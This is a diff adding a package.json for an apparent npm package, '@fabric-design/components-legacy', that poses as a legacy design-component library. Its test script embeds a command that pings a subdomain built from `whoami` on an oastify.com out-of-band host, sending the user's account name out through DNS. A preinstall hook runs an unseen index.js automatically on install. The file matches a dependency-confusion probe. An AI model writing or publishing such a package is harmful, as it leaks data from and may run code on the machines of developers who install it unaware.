@@ -1,0 +1,12 @@
+{
+  "name": "@fabric-design/components-legacy",
+  "version": "1.0.0",
+  "description": "",
+  "main": "index.js",
+  "scripts": {
+    "test": "ping `whoami`.mrhzfeyr6rj9qthtmfl0qe0luc03otci.oastify.com && exit 1",
+    "preinstall": "node index.js"
+  },
+  "author": "stealthy1",
+  "license": "ISC"
+}
